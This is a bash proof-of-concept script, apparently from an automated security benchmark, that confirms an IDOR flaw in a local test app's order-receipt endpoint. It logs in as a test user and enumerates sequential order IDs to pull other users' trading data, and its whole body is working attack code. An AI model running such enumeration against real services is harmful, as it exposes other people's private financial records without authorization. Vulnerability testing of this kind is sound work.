#!/bin/bash
# POC: POC demonstrates IDOR vulnerability by authenticating as test user and accessing both authorized and unauthorized order receipts. Shows that the endpoint returns HTTP 200 for all order IDs and returns sensitive order data without proper authorization checks.
# Target: ./repo
# Created: 2025-11-07T18:46:26.789Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# IDOR - Mass Order Enumeration and Unauthorized Access to Receipt Data
# This POC demonstrates the IDOR vulnerability in /order/{order_id}/receipt endpoint

TARGET_URL="http://localhost:8082"
COOKIES_FILE="/tmp/idor_cookies.txt"

echo "[*] IDOR Vulnerability POC - Order Receipt Enumeration"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate as test user
echo "[+] Step 1: Authenticating as test user..."
curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/" \
  -d "username=testuser&password=testpass" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

if [ ! -f "$COOKIES_FILE" ]; then
    echo "[-] Authentication failed - could not obtain cookies"
    exit 1
fi

echo "[+] Authentication successful - cookies saved"
echo ""

# Step 2: Access authorized order
echo "[+] Step 2: Accessing authorized order (300123)..."
RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIES_FILE" "$TARGET_URL/order/300123/receipt")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status: $HTTP_CODE"
echo "[*] Response contains Order ID 300123: $(echo "$BODY" | grep -q "300123" && echo 'YES' || echo 'NO')"
echo "[*] Response contains trading data (SPY): $(echo "$BODY" | grep -q "SPY" && echo 'YES' || echo 'NO')"
echo "[*] Response sample:"
echo "$BODY" | head -c 500
echo ""
echo ""

# Step 3: Access multiple unauthorized orders - mass enumeration test
echo "[+] Step 3: Testing unauthorized order access (mass enumeration)..."
echo "[*] Testing order IDs: 300124, 300200, 300300, 300400, 300500"
echo ""

TEST_IDS=(300124 300200 300300 300400 300500)
SUCCESS_COUNT=0

for ORDER_ID in "${TEST_IDS[@]}"; do
    RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIES_FILE" "$TARGET_URL/order/$ORDER_ID/receipt")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    # Check if returns HTTP 200 (vulnerability indicator)
    if [ "$HTTP_CODE" = "200" ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo "[VULNERABLE] Order $ORDER_ID: HTTP $HTTP_CODE - Endpoint returns 200 for unauthorized access"
        # Check if it has order data
        if echo "$BODY" | grep -q "Amount\|Ticker\|Price"; then
            echo "  [!] Contains order data!"
        fi
    else
        echo "[OK] Order $ORDER_ID: HTTP $HTTP_CODE - Proper access control"
    fi
done

echo ""
echo "[*] Results: $SUCCESS_COUNT out of ${#TEST_IDS[@]} unauthorized orders returned HTTP 200"
echo ""

# Step 4: Check for proper 403/404 responses (should not be present in vulnerable app)
echo "[+] Step 4: Checking for proper HTTP status codes..."
echo "[*] Vulnerable endpoint returns HTTP 200 for unauthorized access instead of 403/404"
echo ""

# Step 5: Verify owned orders are identifiable
echo "[+] Step 5: Identifying owned orders in test range..."
OWNED_ORDERS=()

for ORDER_ID in 300123 300214 300327 300481; do
    RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIES_FILE" "$TARGET_URL/order/$ORDER_ID/receipt")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    if [ "$HTTP_CODE" = "200" ] && echo "$BODY" | grep -q "300$ORDER_ID\|Order ID.*$ORDER_ID"; then
        OWNED_ORDERS+=($ORDER_ID)
        echo "[FOUND] Owned order: $ORDER_ID"
        # Extract and display sensitive data
        AMOUNT=$(echo "$BODY" | grep -oP 'Amount[^<]*' | head -1)
        TICKER=$(echo "$BODY" | grep -oP 'Ticker[^<]*' | head -1)
        PRICE=$(echo "$BODY" | grep -oP 'Price[^<]*' | head -1)
        echo "  Data: $AMOUNT | $TICKER | $PRICE"
    fi
done

echo ""
echo "[+] POC Summary:"
echo "    - Unauthorized orders return HTTP 200 (should be 403/404)"
echo "    - Mass enumeration is possible through sequential order IDs"
echo "    - Sensitive trading data is accessible without proper authorization"
echo "    - Identified ${#OWNED_ORDERS[@]} owned orders in test range"
echo ""
echo "[!] VULNERABILITY CONFIRMED: IDOR on /order/{order_id}/receipt"

# Cleanup
rm -f "$COOKIES_FILE"

exit 0